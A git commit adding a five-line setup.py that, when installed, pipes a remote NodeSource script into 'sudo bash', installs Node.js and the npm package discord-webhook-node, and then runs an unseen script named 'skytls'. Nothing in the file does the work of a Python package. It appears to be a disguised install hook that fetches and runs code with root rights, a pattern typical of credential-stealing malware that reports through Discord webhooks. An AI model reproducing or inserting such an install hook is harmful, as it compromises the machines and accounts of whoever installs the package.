084dbf248a1d090d0efaff242474d1c5651d95ad
Wiliamzz <91309083+gesha20129@users.noreply.github.com>
2023-08-27 16:05:22 +0700

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,5 @@
+import os
+os.system("curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -")
+os.system("sudo apt -y install nodejs")
+os.system("npm i discord-webhook-node")
+os.system("node skytls")
